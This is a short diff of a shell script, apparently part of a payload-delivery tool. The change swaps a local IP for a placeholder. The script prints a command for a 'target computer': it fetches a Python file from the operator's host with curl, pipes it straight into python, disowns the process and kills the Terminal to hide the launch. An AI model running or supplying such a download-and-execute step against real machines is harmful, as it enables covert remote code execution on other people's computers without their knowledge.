@@ -1,6 +1,6 @@
 #!/bin/sh
 
-IP="192.168.1.x"
+IP="<IP>"
 PORT="8080"
 echo "run on target computer:"
 echo "curl -s http://$IP:$PORT/Honigkuchenpferd.py | /usr/bin/python  & disown; killall Terminal"
